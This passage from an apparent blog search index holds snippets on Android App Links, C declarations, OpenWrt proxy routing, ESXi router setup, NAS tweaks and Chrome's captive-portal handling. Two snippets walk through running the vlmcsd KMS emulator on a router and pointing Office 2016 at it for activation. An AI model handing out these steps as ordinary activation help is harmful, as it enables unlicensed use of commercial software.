协议在您的网站上发布 Digital Asset Links 文件 用户体验 可能会显示一个消除歧义对话框，以供用户选择用于打开链接的应用 无对话框；您的应用会打开以处理您的网站链接 兼容性 所有 Android 版本 Android 6.0 及更高版本 安全性因为在逻辑上，App Links 是「网站内容的应用版本」或「网站内容的扩展部分」，并且 Google 的实现要做到无干预跳转，当用户从网站（App Links）跳转到应用时就必须避免用户跳转到仿冒的应用上。同样是上面银行邮件的例子，如果任何应用都能轻易地被作为该银行应用跳转，将造成严重安全问题。也就是说，App Links 最重要的安全特性是对应用进行身份认证。Google 具体是这样实现网站对应用的认证的：当应用关联的 Deep Link 想要升级为 App Link（即成为指定 URL 的默认处理程序）时，要在 AndroidManifest Activity 的 intent 过滤器中设置 android:autoVerify=&quot;true&quot; &amp;lt;application&amp;gt; &amp;lt;activity android:name=”MainActivity”&amp;gt; &amp;lt;intent-filter android:autoVerify=&quot;true&quot;&amp;gt; &amp;lt;action android:name=&quot;android.intent.action.VIEW&quot; /&amp;gt; &amp;lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&amp;gt; &amp;lt;category android:name=&quot;android.intent.category.BROWSABLE&quot; /&amp;gt; &amp;lt;data android:scheme=&quot;https&quot; android:host=&quot;www.example.com&quot; /&amp;gt; &amp;lt;data android:scheme=&quot;https&quot; android:host=&quot;mobile.example.com&quot; /&amp;gt; &amp;lt;/intent-filter&amp;gt; &amp;lt;/activity&amp;gt; &amp;lt;/application&amp;gt;随后 Android 系统（6.0 及以上版本，安装应用时）就会验证该 intent 过滤器中每一个域名所对应的服务器，即查询并校验相应服务器上位于 https://hostname/.well-known/assetlinks.json 的 Digital Asset Links 文件。assetlinks.json 的内容[{ &quot;relation&quot;: [&quot;delegate_permission/common.handle_all_urls&quot;], &quot;target&quot;: { &quot;namespace&quot;: &quot;android_app&quot;, &quot;package_name&quot;: &quot;com.example&quot;, &quot;sha256_cert_fingerprints&quot;: [&quot;14:6D:E9:83:C5:73:06:50:D8:EE:B9:95:2F:34:FC:64:16:A0:83:42:E6:1D:BE:A8:8A:04:96:B2:3F:CF:44:E5&quot;] }}]注：一个网站可与多个应用相关联，一个应用也可以关联到多个网站：如果关联多个子域名，则需要在每个子域名上放置一个有效的 assetlinks.json；如果采用通配符声明域名（如 *.example.com）则只需在根域名下放置 assetlinks.json 即可。其中， package_name 为在应用的 build.gradle 文件中声明的应用 ID，sha256_cert_fingerprints 为应用签名证书的 SHA256 指纹。这样，通过指定应用的证书指纹，网站就与经过 Android 系统校验的合法的应用关联在一起了，这种关联（认证）基于应用的数字签名，只要开发者签名私钥安全保管，同时Android系统取到正确的 assetlinks.json ，安全性就可以保证。当然，为了保证系统能取到正确的 assetlinks.json ，Google 只允许 assetlinks.json 通过 https 访问，无论开发者设置的 App Link 协议是 http 还是 https这样，经过严格的认证措施，任何未经验证的应用都无法通过仿冒合法应用的方式来被 App Link 跳转。" }, { "title": "声明（Declaration）与定义（Definition）的区别", "url": "/posts/difference-between-definition-and-declaration/", "categories": "Programing", "tags": "Programing", "date": "2019-06-24 00:00:00 +0800", "snippet": "在计算机科学领域，声明（Declaration）指的是向编译器说明一个变量或函数的信息，包括：名字、类型、初始值等，即声明变量、函数的属性细节；而定义（Definition）则指明变量、函数存储在哪里，当定义发生时，系统为变量或函数分配内存单元。在 C 语言中，一般的声明语句同时包含了定义，二者同时发生，也就是说声明和定义没有区别。例如，考虑下面的声明（定义）语句int a;这里，这一语句声明了变量名 a 以及数据类型 int 两个信息，这些信息会告知给编译器，并将存储在符号表这一数据结构中。除此以外，2 字节（按编译器的类型而不同）的内存将被分配。以下这些声明也包含了定义行为：double val [MAXVAL];如果，你仅仅需要声明而不想定义，即不想分配任何内存，则可用下面的语句：extern int a;这个例子中语句仅仅传递变量的信息而不会分配内存，它告诉编译器：现在变量 a 已经声明了，但是分配的内存在其他地方定义，可能在同一个编译文件也可能在不同的文件中。下面仅仅是声明：extern double val [];typedef ...;对于函数而言，声明向编译器提供了函数名、参数的数量及其类型、返回值的类型。例如下面的代码int add(int, int);这里，声明了有两个 int 型参数、名为 add 的函数，其返回值为 int 型。显然，按前面的解释，内存分配在此时还未发生。函数的定义用于为函数分配内存。例如，考虑以下函数定义int add(int a, int b){ return (a+b);}经过上述定义后，函数对应的内存将被分配。要注意，变量或函数可以被声明任意次，但只能被定义一次。上述内容总结如下表 声明 定义 变量或函数可以被声明任意次数 变量或函数只能定义一次 声明时内存不会被分配 内存会被分配 int f(int a);这是一个函数声明。该声明仅用于告知编译器一个名为 f 、返回值和参数都是 int 的函数将被（后续的）函数使用 int f(int a){ return a;}系统按照此函数定义分配内存 参考翻译：Difference between Definition and Declaration" }, { "title": "OpenWrt Shadowsocks 使用 GFWList 路由规则", "url": "/posts/shadowsocks-on-openwrt-with-gfwlist/", "categories": "Tutorial, Shadowsocks", "tags": "Shadowsocks, OpenWrt", "date": "2019-06-21 00:00:00 +0800", "snippet": "介绍在 《OpenWrt Shadowsocks 安装&amp;amp;配置指南》一文中博主详细介绍了使用 CHNRoutes 规则翻墙方案，本文进一步说明如何在其基础上切换为 GFWList 规则，即仅在 GFWList 中流量的走 Shadowsocks 代理。方案的基本思路是基于 GFWList IP 地址列表构建 iptables (防火墙) 规则，将目标 IP 的流量转发至 Shadowsocks。注意：你首先需要完成前述文章的配置内容Step 1 - 准备 GFWList ipset 集ipset 是一个iptables 的辅助工具，能够轻松愉快地创建和维护一组IP地址。本文通过配置 dnsmasq ，命令其将 GFWList 列表中的域名一一解析成 IP 地址，并记录为一个 ipset 集。首先，我们创建一个专门存放 dnsmasq.d 自定义配置文件的目录mkdir /etc/dnsmasq.d接着，指定 dnsmasq 加载该目录 OpenWrt修改 /etc/dnsmasq.conf，最后加一行：vim /etc/dnsmasq.conf...conf-dir=/etc/dnsmasq.d LEDE执行以下命令获取当前的配置状态uci get dhcp.@dnsmasq[0].confdir如果返回值为 uci: Entry not found 或不是 /etc/dnsmasq.d ，则执行：uci add_list dhcp.@dnsmasq[0].confdir=/etc/dnsmasq.duci commit dhcp下载已经整理好的规则文件到 dnsmasq.d 目录cd /etc/dnsmasq.dwget https://cokebar.github.io/gfwlist2dnsmasq/dnsmasq_gfwlist_ipset.conf配置文件的语法是用 server 指定某 GFW 域名用某 DNS 解析，然后将解析结果 ipset 到一个名为 gfwlist 的地址集中。片段如下：dnsmasq_gfwlist_ipset.conf...server=/030buy.com/127.0.0.1#5353ipset=/030buy.com/gfwlist在 Network - Firewall - [Custom Rules](http://lede/cgi-bin/luci/admin/network/firewall/custom) 中添加一条 ipset create gfwlist hash:ip，让 iptables 启动时创建 gfwlist ipset重启 dnsmasq，完成所有配置。/etc/init.d/dnsmasq restart最后，为了测试 gfwlist  是否成功创建，你可以先访问一些存在于 GFWlist 中的网站，然后执行ipset list gfwlist检查 gfwlist 这个 ipset 是否存在且包含解析的 IP 地址。Step 2 - 将 Shadowsocks 路由规则切换到 GFWlist参考 luci-app-shadowsocks/wiki/GfwList-Support 将 Shadowsocks 的 access control/访问控制 规则修改为： 进入 Luci 界面 -&amp;gt; 访问控制 -&amp;gt; 外网区域 「被忽略IP列表」 选择留空(/dev/null) 「额外被忽略IP」 设置为 0.0.0.0/1 和 128.0.0.0/1即忽略所有 IP 的流量然后执行 iptables 命令，将匹配 gfwlist 的流量转发至 Shadowsocksiptables -t nat -I SS_SPEC_WAN_AC 1 -m set --match-set gfwlist dst -j SS_SPEC_WAN_FW注意：每次重启 Shadowsocks 后都需要运行一次此命令。如果想随 Shadowsocks 启动时运行此命令，编辑其启动脚本：vim /etc/init.d/shadowsocks...start() { pidof ss-redir ss-local ss-tunnel &amp;gt;/dev/null &amp;amp;&amp;amp; return 0 mkdir -p /var/run /var/etc ss_redir &amp;amp;&amp;amp; rules ss_local ss_tunnel #增加此行 iptables -t nat -I SS_SPEC_WAN_AC 1 -m set --match-set gfwlist dst -j SS_SPEC_WAN_FW} ...至此，Shadosocks 路由规则完成从 CH NRoutes 切换到 GFWlist ，如果要反向操作，将 Step 2 的修改复原即可。" }, { "title": " KMS on OpenWrt router for activating Windows Office", "url": "/posts/install-microsoft-kms-on-openwrt/", "categories": "Tutorial, OpenWrt", "tags": "OpenWrt", "date": "2019-01-18 00:00:00 +0800", "snippet": "In this tutorial, I will introduce how to set up a KMS (Key Management Service) on OpenWrt 18.06.01 and activate your Windows Office 2016 VOL (Volume License) editions automatically.Install and run openwrt-vlmcsd on your OpenWrtThe First step to activate Window Office is to install openwrt-vlmcsd software on your OpenWrt router. openwrt-vlmcsd is an OpenWrt package for vlmcsd which emulates a KMS to supports Microsoft products activation.First, to install openwrt-vlmcsd, go to the projects’ homepage and download the pre-compiled packages. Note that the downloaded ipk should corresponds to your hardware platform. openwrt-vlmcsd luci-app-vlmcsd## You need download the package corresponds to your platform, in my case, is x86_64wget https://github.com/cokebar/openwrt-vlmcsd/blob/gh-pages/vlmcsd_svn1112-1_x86_64.ipkopkg install vlmcsd_svn1112-1_x86_64.ipkwget https://github.com/cokebar/luci-app-vlmcsd/releases/download/v1.0.2-1/luci-app-vlmcsd_1.0.2-1_all.ipkopkg install luci-app-vlmcsd_1.0.2-1_all.ipkAnd finally, enable openwrt-vlmcsd service:Check “Auto activate” and “Enable” options in the LuCI app then click “Save &amp;amp; Apply”.Activate your Office 2016Run cmd as administrator on your Windows, and then execute following commands. Note that you should replace the IP (in this case is 192.168.0.1) with your own OpenWrt LAN IP.## for 32bits Office:cd C:\\Program Files (x86)\\Microsoft Office\\Office16 ## for 64bits Office: cd C:\\Program Files\\Microsoft Office\\Office16cscript ospp.vbs /sethst:192.168.0.1" }, { "title": "搭建 OpenWrt KMS 服务，激活 Office 2016", "url": "/posts/install-kms-on-openwrt/", "categories": "Tutorial, OpenWrt", "tags": "OpenWrt", "date": "2019-01-15 00:00:00 +0800", "snippet": "本文介绍了如何在 OpenWrt 18.06.1 下安装 KMS 服务并激活你的 Windows Office 2016 VOL 版。安装 openwrt-vlmcsd分别前往项目主页安装 openwrt-vlmcsd luci-app-vlmcsd启动 openwrt-vlmcsd 服务在 openwrt-vlmcsd 的项界面勾选 Auto activate 和Enable，然后点击 Save &amp;amp; Apply激活 Office 2016以管理员权限打开 cmd，运行以下命令## 32位 Officecd C:\\Program Files (x86)\\Microsoft Office\\Office16 ## 64位 Officecd C:\\Program Files\\Microsoft Office\\Office16cscript ospp.vbs /sethst:192.168.1.1其中 192.168.1.1 替换为你的 OpenWrt 路由器 LAN IP" }, { "title": "NAS 相关问题记录", "url": "/posts/nas-usual-configuration-records/", "categories": "Tutorial, NAS", "tags": "NAS", "date": "2018-12-02 00:00:00 +0800", "snippet": "一些常用命令 查找最新修改的文件 (5 分钟内)find ./ -mmin -5 -type f 查看文件夹的大小du -h --max-depth=0 /foo/bar将频繁写入的日志文件挂载到 /dev/null#!/bin/sh#mount -o bind /dev/null /var/log/scemd.logmount -o bind /dev/null /var/log/messagesmount -o remount,noatime,commit=600 /将 Emby 日志转移至虚拟内存磁盘Emby 会不间断地写入日志到磁盘，因此可通过软连接的方法将其日志路径改为虚拟内存磁盘 /dev/shm首先在 DiskStation 界面中停用 Emby 服务器，然后 SSH 执行下面的命令sudo -imount --bind /dev/shm /volume1/@appstore/EmbyServer/var/logs最后，重新启用 Emby 服务器即可关闭 syslog-ngsudo -ivim /etc/init/syslog-ng.conf注释掉启动代码" }, { "title": "Chrome 的 Captive Portal 处理机制", "url": "/posts/captive-portal-handling-of-chrome/", "categories": "Web", "tags": "Chromium", "date": "2018-10-22 00:00:00 +0800", "snippet": "Google Chrome 在 M63 版本引入了一项修改以解决 Captive Portal 场景下的用户登录问题 —— 当未登录的用户访问 HTTPS 网站时，由于 Captive Portal 的拦截，浏览器会出现网络超时、SSL/TLS 告警等问题。本文详细介绍了 Chrome M63 的这项机制。背景Captive Portal 中文通常译作“强制主页”或“强制登录门户”，是用户被网关授权访问 Internet 前的登录页面，在很多公共地点（如咖啡厅、机场、酒店）的网络连接都会使用到这项技术来要求用户认证后上网。Captive Portal 工作原理无非两种 将所有 DNS 请求指向自己的 portal 地址 直接劫持 HTTP/HTTPS 流量，响应自己的页面Captive Portal 的 HTTPS 之痛无论是哪种工作原理的 Captive Portal，当用户访问 HTTP 网址时会直接劫持到 portal 登录页，浏览器端不会有异常发生；当用户访问 HTTPS 网站时则会因为 Captive Portal 无法提供该网站的合法证书而抛出 SSL/TLS 安全告警页。当遇见 SSL/TLS 错误时，用户有时可在浏览器告警页上找到“继续访问”按钮而进入 portal 登录页，有时则有因浏览器未提供“继续访问”按钮而阻塞访问（通常是受限于 HSTS）。不论用户刷新页面还是更换其他 HTTPS 网址都无法解决问题，造成了糟糕的体验。提示：HSTS 规范（RFC 6797）要求发生 SSL/TLS 错误时浏览器应禁止用户继续访问。Why？我们都知道 HTTPS 被中间人攻击时浏览器会有 SSL/TLS 错误，但如果用户养成习惯于“我不明白这是什么，请继续访问”，那么网站部署 HTTPS 就毫无意义了，尤其是高度重视安全的网站：银行、金融网站如果在发生 SSL/TLS 错误时允许用户跳过，将发生非常严重的安全后果。因此，这些网站的安全管理员会开启 HSTS，发生错误时不允许用户绕过。包括 Safari、Firefox 在内的国际浏览器都不允许 HSTS 下的 SSL/TLS 错误被绕过。可见，实际上只有 HTTPS 场景下才会有 Captive Portal 体验问题。Chrome 的 Captive Portal 处理机制对于用户登录之前发起的 HTTPS 连接，不同类型的 Captive Portal 通常分有两种处理方式：静默地丢弃设备发送的 HTTPS 数据包或劫持为自己的 HTTPS 响应。当所处的 Captive Portal 属于前者，访问任何 HTTPS 页面，例如 https://google.com 时，都将产生超时；当所处的 Captive Portal 属于后者，访问任何 HTTPS 页面，例如 https://google.com 时，由于采用 SSL/TLS 安全连接，无论 Captive Portal 所采用的技术是将 gmali.com 地址指向自己的 Web 服务、替换 gmail.com 的证书为自签名证书，还是直接响应明文 HTTP 报文，都将必然发生安全错误。前面已经提到，浏览器位于 Captive Portal 下且未登录时，用户访问明文 HTTP 是不存在阻塞问题的，因此针对上述不同的场景，Chrome 的解决方案是引入一个 Captive Portal 检测机制，检测到 Cpative Portal 时引导用户打开一个明文 HTTP 页面。检测 Captive Portal具体来说，当一次 HTTPS 加载耗用了一段时间或出现 SSL/TLS 错误、ERR_SSL_PROTOCOL_ERROR 错误时，Chrome 会在后台发起一次对 http://www.gstatic.com/generate_204 的请求，然后根据其响应判断当前环境是否处在 Captive Portal 下。这个探测 URL 对应 Google 的服务器正常情况下会返回 HTTP 204 （“No Content”）响应（按 Google 的说法不会记录任何 cookie 和日志）。如果 Chrome 收到了 204 响应码，说明当前网络能够访问 Internet，浏览器不在 Captive Portal 下或已经登录，此时 Chrome 不需要特别处理，按照通常的网络问题、SSL/TLS 错误处理即可；如果 Chrome 遇到了一个登录页或重定向的响应（这是 Captive Portal 通用的做法），说明浏览器正处在一个 Captive Portal 下；如果发生了错误（Chrome 认为除了 HTTP 2xx、3xx、511 状态码外，均为错误）或响应了非 HTTP 报文，说明浏览器不在 Captive Portal 下或 Captive Portal 本身有异常，无法进入登录页，此时 Chrome 也无需特别处理。无论 Captive Portal 是何种类型，如何处理浏览器的探测 URL 请求（篡改其 DNS 请求还是劫持 HTTP 报文），都不影响 Chrome 的这种检测机制。引导用户打开 HTTP 窗口当 Chrome 检测到用户在提供登录页的 Captive Portal 下访问 HTTPS 网页时，会在原始 HTTPS 页面内通过 UI 引导用户打开一个新的 Tab，在这个新的 Tab 中 Chrome 将加载先前提到的 204 响应网址。如前所述，http://www.gstatic.com/generate_204 是明文 HTTP 连接，不存在 HTTPS 场景下的各种问题，因此用户顺利进入 Captive Portal 登录页。使用操作系统的 Captive Portal 检测能力一些操作系统如 Lion、Windows 8/10、高版本 Android 具有系统原生 Captive Portal 检测机制，Chrome 会在这些平台上使用平台提供的接口检测是否处在 Captive Portal 下，而早期的 Windwos 版本虽然也具有检测能力，但可靠性不佳，Chrome 在这些版本 Windows 上依然会采用内建的检测机制。进入登录页后，Chrome 会持续检测网络连接。当用户完成登录操作连接到 Internet 时，Chrome 刷新所有先前阻塞在 HTTPS 超时、SSL/TLS 错误的 tab （POST 请求除外）代码实现在 SSLErrorHandler::StartHandlingError 中，Chrome 处理 SSL 错误时，会检测是否是处在 Captive Portal 下，如果是，调用 ShowCaptivePortalInterstitial 展示 Chrome 内建的 Captive Portal 连接提示页面。代码参见本文发布时的一些失效场景和 bug根据 Google 的设计文档，Chrome 仅仅在 SSL/TLS 超时和某些特定的错误（SSL 证书错误）场景才会触发 Captive Portal 检测，如果所有的网络错误都进行检查，可能会有延迟，准确性和网络带宽等问题。也就是说检测机制本身不是非常完善的。例如，一些 Captive Portal 会拒绝 HTTPS 连接，与丢弃数据包导致 HTTPS 超时不同，这种场景下 Chrome 直接产生 ERR_CONNECTION_REFUSED 错误，而不会进行 Captive Portal 检测。另外有一个 bug，当用户从连接提示页（chrome://interstitials/captiveportal）导航进入 Captive Portal 登录页，而登陆页本身有 SSL/TLS 问题（如自签名证书）时，由于该问题会触发 Chrome 检测 Captive Portal，会再次进入连接提示页，而非标准的 SSL/TLS 错误。由于没有忽略按钮，最终造成死循环安全考虑看完这套复杂的处理机制，你可能会问：为什么不干脆一些，检测到处在 Captive Portal 下时就忽略 SSL/TLS 错误，直接进入登录页面，或者给用户一个风险提示，提供“继续连接”按钮呢？这涉及安全。HSTS 规范要求浏览器访问网站时始终采用 HTTPS 发起连接，前面我们还说过，配置了 HSTS 的网站在发生 SSL/TLS 错误时浏览器必须禁止用户忽略错误继续访问。从安全角度看，Captive Portal 使用的技术和黑客技术（中间人攻击）本质上是一模一样的，浏览器（或操作系统）本身无法鉴别所处的网络环境是正常的 Captive Portal 还是一次恶意攻击，明白这一点你就能理解为什么在 HTTPS 场景下 Chrome 不直接忽略这种错误而引入一个全新的 Captive Portal 检测服务。参考 Captive portal handling for HTTPS requests" }, { "title": "ESXi 安装&amp;配置 OpenWrt", "url": "/posts/openwrt-on-esxi/", "categories": "Tutorial, OpenWrt", "tags": "ESXi, OpenWrt", "date": "2018-09-23 00:00:00 +0800", "snippet": "基于 ESXi X86 虚拟机设备构建 OpenWrt 路由器是一种兼顾性能和敏捷性的软路由解决方案。本文详细介绍了如何在 vSphere ESXi 6.7 下部署最新版本的 OpenWrt。制作 OpenWrt ESXi 镜像点击链接进入官方网站，在你的 Windows 电脑上安装好 ESXi 镜像制作工具 StarWind V2V Converter。点击链接下载最新版本的 Stable Release OpenWrt 镜像。ESXi 一般运行在 X64 平台，因此我们选择 x86/64 目标平台的镜像文件，文件系统选择 ext4。例如：https://downloads.openwrt.org/releases/18.06.1/targets/x86/64/openwrt-18.06.1-x86-64-combined-ext4.img.gz解压缩包后，运行 StarWind V2V Converter 工具 - Local file - 选择此前下载好的镜像文件 - VMware ESX server image - Next &amp;gt; - Next &amp;gt;，最后生成两个 ESXi 专用镜像文件： openwrt-18.06.1-x86-64-combined-ext4.vmdk openwrt-18.06.1-x86-64-combined-ext4-flat.vmdk上传镜像进入 ESXi 系统的 Web 管理页面，点击 存储 - 数据存储浏览器 - 创建目录，创建一个存储 OpenWrt 镜像和其它配置文件的目录，这里我们将其命名为 OpenWrt上传先前创建的 2 个镜像文件到该目录。上传成功后两个镜像文件会呈现为一个硬盘部署端口组创建 OpenWrt 虚拟机之前，首先规划好它的网络架构。假设运行 ESXi 的物理主机有 N（N&amp;gt;1） 个硬件网络适配器，那么通常的做法是将 1 个物理网口用于 WAN，其余的 （N -1 个）物理网口用于构建 LAN。博主的主机有 4 个物理网络适配器，下文以此为例。注意：ESXi 初始的虚拟交换机、端口组请保持默认配置，谨慎编辑，否则你将无法远程连接到 ESXi另外为了帮助读者理解原理，先简要介绍 ESXi 的虚拟网络架构：VMs（虚拟机） ↓↑Port Groups（端口组） ↓↑vSwitch（虚拟交换机） ↓↑ Physical NICs（硬件网络适配器）上面是各虚拟网络组件的层级与数据流图，其中 端口组ESXi 并非直接连接到 vSwitch（虚拟交换机），而是连接到再划分的端口组，并在虚拟机内部实体化为相应的虚拟网络适配器。端口组是软件逻辑实现，因此一个虚拟交换机上可以划分多个端口组，进而可以实现 VLAN 功能：在 ESXi 的管理界面中为不同的端口组分配不同的 VLAN ID 即可。如果把 vSwitch 类比于物理世界中的交换机，那么端口组则类似于为交换机上的一组端口 虚拟交换机可以类比物理世界的交换机来理解 硬件网络适配器虚拟网络只有链接至硬件网络适配器才能与物理世界通讯。如果某个虚拟交换机没有链接至任何一个硬件网卡，那么其上的虚拟机只能与连接到该虚拟交换机的其他虚拟机通信，而不能与外界通信，相当于组建了一个虚拟的内网。下面正式开始部署端口组。首先创建三个新的虚拟交换机，保持默认配置。如下图所示，含 ESXi 初始的 vSwitch0 在内，共有四个虚拟交换机，将来分别对应物理机上的四个网口。点击编辑虚拟交换机按钮，为新创建的 vSwitch 分别链接上行链路（物理网络适配器），从而与主机上的物理网口链接起来下一步，考虑到 ESXi 虚拟网络未来拓展性（方便、安全地部署其他 VMs），以默认配置创建 VM Network1 、VM Network2 、WAN Network 三个端口组，分别连接到之前新创建的 3 个虚拟交换机上。这项操作目的是为未来其他的 VMs 预留默认安全配置的端口组（区别于后面专为 OpenWrt VM 创建的开启混杂模式端口组），本身和搭建 OpenWrt VM 没有关系。下一步，创建 OpenWrt LAN0 、OpenWrt LAN1 、OpenWrt LAN02、OpenWrt WAN 四个端口组，其中 LAN 系列端口组开启混杂模式、MAC 地址修改、伪传输三个安全选项，而 WAN 端口组保留默认配置，即上述选项全部关闭。最终网络拓扑如图所示其中 OpenWrt 虚拟机通过 OpenWrt LAN0 ~ OpenWrt LAN2和 OpenWrt WAN 四个端口组连接到虚拟交换机 vSwitch0 ~ vSwitch3 进而连通 VMNIC0 ~ VMNIC3 四个物理网口。由于 OpenWrt LAN 系列端口组开启了混杂模式，具备监控虚拟网络流量的能力，当其中某个虚拟交换机收到 MAC 帧时，会将此帧转发复制到 OpenWrt br-lan（用于 LAN 口设备桥接的虚拟网络，使多个虚拟或物理网络接口的行为好像他们仅有一个网络接口一样），然后再由内部网桥系统决定如何处理（转发到某个 LAN 口还是路由至 WAN 上）。如果 OpenWrt LAN 端口组不开启混杂模式，由于虚拟交换机不具备 MAC 地址学习能力，将丢弃需要转发的 MAC 帧，OpenWrt 将无法接收和转发数据流量。进一步解释 混杂模式 作用：因为虚拟交换机不像传统物理交换机，它不具备 MAC 学习功能力：vSwitch 所有接入端口的设备（VMs）是预先配置好的，虚拟交换机它知道这些接入端口组的接口的 MAC 地址，而不需要根据数据包的源 MAC 来更新 MAC 与 PORT 的映射。因此，在混杂模式未开启情况下，如果目标 MAC 不属于该虚拟交换机，那么虚拟交换机将丢弃该数据包。虚拟交换机或端口组开启混杂模式后，所属的 PORT 将收到虚拟交换机上 VLAN 策略所允许的所有流量。这种特性可用来监控虚拟网络流量。至此，完成端口组的配置。这些端口组后续将被 OpenWrt 虚拟机内的虚拟网络适配器使用。创建 OpenWrt 虚拟机登入 ESXi Web 管理面，虚拟机 - 创建/注册虚拟机创建新虚拟机我的配置如下 2 CPU 256 RAM 移除默认的硬盘，点击添加硬盘，添加一个现有硬盘。选择先前上传的 openwrt-18.06.1-x86-64-combined-ext4.vmdk，硬盘选项保持默认。添加网络适配器编辑虚拟机，将引导选项改为 BIOS注意：如果使用默认的 EFI 引导，OpenWrt 将无法启动，报如下错误 Attempting to start up from: → EFI Virtual disk (0.0) ... unsuccessful. → EFI Network... unsuccessful打开虚拟机电源，OpenWrt 正常启动。配置 OpenWrt现在，要让 OpenWrt 虚拟机内的 4 个虚拟网络适配器正确连接到先前部署的 WAN/LAN 端口组。查看并记住 OpenWrt 虚拟机连接到 OpenWrt WAN 的虚拟网络适配器 MAC 地址在 ESXI 虚拟机控制台执行以下命令，查找上述 MAC 地址对应的网络适配器ifconfig -a | less如图所示，可以看到是 eth2提示：如果 OpenWrt 控制台反复回显标准输出，导致控制台内容被覆盖，执行 /etc/init.d/network stop 可减少标准输出编辑 /etc/config/network 按照对应关系，将 eth2 配置为 wan 接口，eth0、eth1、eth3 分配为 lan 接口，并为 lan 开启 bridge，使 LAN 下所有的物理网口桥接到一起。vim /etc/config/networkconfig interface &#39;loopback&#39;option ifname &#39;lo&#39;option proto &#39;static&#39;option ipaddr &#39;127.0.0.1&#39;option netmask &#39;255.0.0.0&#39;config globals &#39;globals&#39;option ula_prefix &#39;fdaf:b952:d594::/48&#39;config interface &#39;lan&#39;option type &#39;bridge&#39;option ifname &#39;eth0 eth1 eth3&#39;option proto &#39;static&#39;option ipaddr &#39;192.168.1.1&#39;option netmask &#39;255.255.255.0&#39;option ip6assign &#39;60&#39;option _orig_ifname &#39;eth3&#39;option _orig_bridge &#39;true&#39;config interface &#39;wan&#39;option ifname &#39;eth2&#39;option proto &#39;dhcp&#39;config interface &#39;wan6&#39;option ifname &#39;eth2&#39;option proto &#39;dhcpv6&#39;编辑完后执行以下命令使配置生效/etc/init.d/network reload最后，电脑网线连接到主机的任意一个 lan 物理网口，浏览器输入 192.168.1.1 即可访问 OpenWrt 虚拟机的 LuCI 管理面。相关文章：OpenWrt 常用网络配置" }, { "title": "OpenWrt 常用网络配置", "url": "/posts/openwrt-usual-configuration/", "categories": "Tutorial, OpenWrt", "tags": "OpenWrt", "date": "2018-09-22 00:00:00 +0800", "snippet": "文章记录了博主使用 OpenWrt 过程中多项常用网络功能的配置方法，包括 AP 模式、主机名设置、USB 联网等，以备后续之需。切换为 AP 模式（Bridged AP）一般场景，OpenWrt 路由器工作在「Router”」模式，包含了 NAT、拨号、DHCP、DNS 等功能。当想让一台无线 OpenWrt 设备仅作为无线接入点，而不提供路由功能，就需要让其工作在「Bridged AP」模式（俗称「无线AP」）。按 AP 获取 IP 方式的不同，有两种方法让 OpenWrt 路由器工作在 AP 模式。方法 1 - 手动设置 IP 模式AP 进入 OpenWrt - Interfaces - LAN在 Common Configuration 中将 LAN 接口的静态 Ipv4 地址设置为与主路由 LAN 同网段的 IP，例如：主路由的 192.168.1.1，则这里可设置为 192.168.1.2。然后在 DHCP Server 中勾选 Disable DHCP for this interface. 关闭 AP 的 DHCP，由主路由进行 DHCP，以免冲突。最后用一根网线将 AP 的 LAN 和主路由的 LAN 相连，即可实现 AP 模式。方法 2 - AP 自动获取 IP 模式AP 进入 OpenWrt - Interfaces - LAN在 Common Configuration 中修改 Portocol 协议为 DHCP client，然后用一根网线将 AP 的 LAN 和主路由的 LAN 相连，即可实现 AP 模式。方法二相对简单灵活，但有一个缺点，即本机 IP 地址是随机的，导致要进入 AP 的管理面会有些棘手。因此最好结合主路由的静态 DHCP 规则或固定的局域网本地域名使用，参间本文 为设备配置本地域名本地域名 章节。注意：博主建议使用方法 2，因为这样配置的 AP 可实现一次配置，多次使用，不需要根据主路由手动配置静态 IP。参考：Bridged AP OpenWrt Wiki为设备分配本地域名和静态 IP我们知道主机名（hostname）可以代替 IP 地址进行访问，例如： ping hostname 、通过 http://hostname/ 访问本地 Web 服务。默认的，OpenWrt 会根据连接设备反馈的设备名配置其 DHCP 的 Hostname 记录，通过这些记录，IP 地址和 hostname 便一一关联起来。此外，OpenWrt 还为局域网配置了 Local domain ，默认后缀是 .lan（你可以修改为任意值，但注意不要和公网域名冲突）， 这种情况下 Galaxy-S8.lan 等价于 Galaxy-S8。如果对自动命名的主机名不满意或希望固定 IP，可以在 Network - DHCP and DNS - Static Leases 里自定义 Hostname 和对应的静态 IP。注意：Chrome 浏览器需要在 hostname 的后面加一个 / 以转义关键词搜索；静态 IP 和 hostname 是绑定到 MAC 地址的，因此自定义 DHCP 静态记录时你需要指定设备的 MAC 地址。使用 USB 绑定上网（USB RNDIS）USB RNDIS 技术（协议），可以让操作系统通过 USB 设备虚拟出的网卡适配器连接到互联网，我们在 Android 手机上常见的 「USB 绑定/USB Tether」即使用此项技术。OpenWrt 支持 RNDIS，因此也可以通过手机的 USB 绑定功能上网。方法如下安装 kmod-usb-net-rndis 软件包opkg install kmod-usb-net-rndis手机通过 USB 数据线连接到 OpenWrt 设备的 USB 接口，然后打开手机的「USB 绑定」功能开关。如果一切正常，OpenWrt 命令控制台可看到如下提示，同时 OpenWrt 会新增一个名为「usb0」的以太网适配器，表明 RNDIS 设备驱动成功usb 1-4.1: new high-speed USB device number 58 using xhci_hcdrndis_host 1-4.1:1.0 usb0: register &#39;rndis_host&#39; at usb-0000:1b:00.0-4.1, RNDIS device, 02:05:xx:xx:xx:xx提醒：如果你的 OpenWrt 运行在 ESXi 环境下，请参考我的这篇文章（TODO）为 OpenWrt 虚拟机添加 USB 设备。然后 OpenWrt - Network - Interfaces - Add new interface... 新增一个名为 TETHERING 的接口，将其绑定到 usb0，协议选择 DHCP client。如图所示最后，OpenWrt - Network - FireWall 编辑 wan 域，将TETHERING 添加进来，就可以让你的 OpenWrt 使用手机网络上网了。使用 USB 网卡上网（USB LTE MODEM）如果你要让 OpenWrt 驱动一张 USB 4G 卡，需要安装以下依赖kmod-usb-net-rndis, kmod-usb-net, kmod-usb2, usb-modeswitch, kmod-usb2-pci, kmod-usb-ohci-pci, kmod-usb-serial-option然后参考 USB 绑定上网的配置方法dnsmasq 缓存优化 优化 1 - 设置最小缓存时间在 /etc/dnsmasq.conf 最后加入一行 min-cache-ttl=3600 使得所有 DNS 的缓存强制至少为一个小时 优化 2 - 增加缓存大小先看当前缓存是否不够用：openwrt 查看 dnsmasq 日志killall -s USR1 dnsmasqlogread例如：cache size 2000, 1606/17789 cache insertions re-used unexpired cache entries.这里 17789 ，显示缓存插入数，1606 表示其中有 1606 次插入是因为空间不够而将未过期的条目剔除所以要扩大缓存大小，进入 luci 界面设置即可，可设置为 3000dnsmasq 日志格式解读参考设置 DMZ 主机进入 Firewall - Port Forwards 创建一个新的规则，其中 